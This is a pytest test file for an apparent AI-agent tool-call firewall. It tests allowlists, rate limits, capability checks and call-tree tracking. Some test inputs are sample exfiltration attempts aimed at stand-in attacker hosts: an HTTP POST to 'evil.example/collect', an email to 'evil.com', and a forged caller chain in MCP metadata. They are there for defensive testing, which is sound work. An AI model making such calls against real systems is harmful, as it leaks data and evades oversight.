"""ZTA practicality: allowlists, rate limits, proxy-owned call trees, require_caps."""
from __future__ import annotations

import pytest

from tracewall.audit.sink import NullAuditSink
from tracewall.core.firewall import Firewall, args_hash
from tracewall.core.signal import EnrichedEvent, HookEvent, IdentityCtx, Verdict
from tracewall.policy.engine import PolicyEngine, ZTA_RULES_DIR, _extract_host
from tracewall.policy.rate import RateBudget
from tracewall.semantic.judge import SemanticJudge
from tracewall.transports.mcp_proxy import ProxyConfig, build_event_from_mcp, screen_tool_call
from tracewall.transports.profiles import build_firewall_for_profile, get_profile
from tracewall.transports.session_chain import SessionCallTree


def _ev(tool, args=None, caller_chain=None, agent_id="agent-zta", session_id=""):
    return HookEvent(
        agent_id=agent_id,
        tool=tool,
        args=args or {},
        caller_chain=caller_chain or [],
        session_id=session_id,
    )


@pytest.fixture
async def zta_policy(monkeypatch, tmp_path):
    monkeypatch.setenv("TRACEWALL_ORG_DOMAINS", "acme.test")
    p = PolicyEngine()
    await p.load_policies(extra_dirs=[ZTA_RULES_DIR])
    return p


async def test_host_extract_and_allowlist_blocks_external(zta_policy):
    assert _extract_host("https://evil.example/x") == "evil.example"
    he = _ev("http_post", {"url": "https://evil.example/collect", "body": "x"})
    m = await zta_policy.evaluate(EnrichedEvent(event=he, call_tree=[]))
    assert m is not None and m.rule_id == "zta_http_post_host_allowlist"


async def test_http_post_org_host_allowed(zta_policy, ledger):
    await ledger._set_trust("agent-zta", 0.9)
    fw = Firewall(
        ledger=ledger, policy=zta_policy, judge=SemanticJudge(),
        audit=NullAuditSink(),
    )
    v = await fw.check(_ev("http_post", {"url": "https://api.acme.test/v1", "body": "ok"}))
    assert v.action == Verdict.ALLOW


async def test_email_default_deny_external(zta_policy):
    he = _ev("send_email", {"to": "x@evil.com", "body": "hi"})
    m = await zta_policy.evaluate(EnrichedEvent(event=he, call_tree=[]))
    assert m is not None and "default-deny" in m.reason


async def test_rate_exceeds_send_money(zta_policy):
    # first 5 allowed by rate rule (may still block on IBAN rules — use neutral recipient)
    for i in range(5):
        he = _ev("send_money", {"recipient": f"UK00SAFE{i}", "amount": 1})
        m = await zta_policy.evaluate(EnrichedEvent(event=he, call_tree=[]))
        # rate rule should not fire yet; other rules might
        if m and m.rule_id == "zta_rate_send_money":
            pytest.fail(f"rate fired too early on attempt {i+1}")
    he6 = _ev("send_money", {"recipient": "UK00SAFE6", "amount": 1})
    m6 = await zta_policy.evaluate(EnrichedEvent(event=he6, call_tree=[]))
    assert m6 is not None and m6.rule_id == "zta_rate_send_money"


async def test_require_caps_empty_blocks(ledger, policy):
    await ledger.register_identity(IdentityCtx(agent_id="c1", caps=[], trust=0.9))
    fw = Firewall(
        ledger=ledger, policy=policy, judge=SemanticJudge(),
        audit=NullAuditSink(), require_identity=True, require_caps=True,
    )
    v = await fw.check(_ev("read_file", {"path": "/x"}, agent_id="c1"))
    assert v.action == Verdict.BLOCK and "capabilities required" in v.reason


async def test_require_caps_gates_tool(ledger, policy):
    await ledger.register_identity(
        IdentityCtx(agent_id="c2", caps=["read_file"], trust=0.9)
    )
    fw = Firewall(
        ledger=ledger, policy=policy, judge=SemanticJudge(),
        audit=NullAuditSink(), require_identity=True, require_caps=True,
    )
    ok = await fw.check(_ev("read_file", {"path": "/x"}, agent_id="c2"))
    assert ok.action == Verdict.ALLOW
    bad = await fw.check(_ev("http_post", {"url": "https://x"}, agent_id="c2"))
    assert bad.action == Verdict.BLOCK and "not in agent capabilities" in bad.reason


async def test_proxy_owns_call_tree_ignores_forged_meta(firewall, ledger):
    await ledger._set_trust("mcp-client", 0.9)
    tree = SessionCallTree()
    cfg = ProxyConfig(own_call_tree=True)
    # Forged secret→email chain must NOT block when proxy owns the tree (empty history)
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "send_email",
            "arguments": {"to": "partner@trusted.com", "body": "report"},
            "_meta": {
                "tracewall": {
                    "agent_id": "mcp-client",
                    "session_id": "s1",
                    "caller_chain": ["read_secret", "compose"],
                }
            },
        },
    }
    # Without secret in args and without real prior call, forged chain ignored → may ALLOW
    # (email exfil rule needs call_tree). Default org domains include trusted.com.
    resp = await screen_tool_call(firewall, msg, cfg, call_tree=tree)
    # Either forward (None) or block for other reasons — must NOT be solely forged chain.
    # With own tree empty, call_tree_contains_any fails → exfil rule no match.
    assert resp is None or "secret" not in (resp.get("result", {}).get("content", [{}])[0].get("text", "").lower())


async def test_proxy_records_real_chain(firewall, ledger):
    await ledger._set_trust("mcp-client", 0.9)
    tree = SessionCallTree()
    cfg = ProxyConfig(own_call_tree=True)

    async def call(tool, args, sid="sess-a"):
        return await screen_tool_call(
            firewall,
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {
                    "name": tool,
                    "arguments": args,
                    "_meta": {"tracewall": {"agent_id": "mcp-client", "session_id": sid}},
                },
            },
            cfg,
            call_tree=tree,
        )

    # read_secret may not exist as a real tool — still record on ALLOW path
    # Force ALLOW by using high trust read_file first
    assert await call("read_file", {"path": "/secrets/key"}) is None
    assert "read_file" in tree.chain("sess-a", "mcp-client")


async def test_zta_profile_knobs():
    p = get_profile("zta")
    assert p.require_identity and p.require_caps and p.own_call_tree and p.load_zta_pack
    cfg = p.proxy_config()
    assert cfg.own_call_tree is True


async def test_args_hash_stable():
    assert args_hash({"b": 1, "a": 2}) == args_hash({"a": 2, "b": 1})
    assert len(args_hash({"x": 1})) == 16


async def test_rate_budget_unit():
    r = RateBudget()
    assert r.exceeds("k", 60, 2) is False
    assert r.exceeds("k", 60, 2) is False
    assert r.exceeds("k", 60, 2) is True
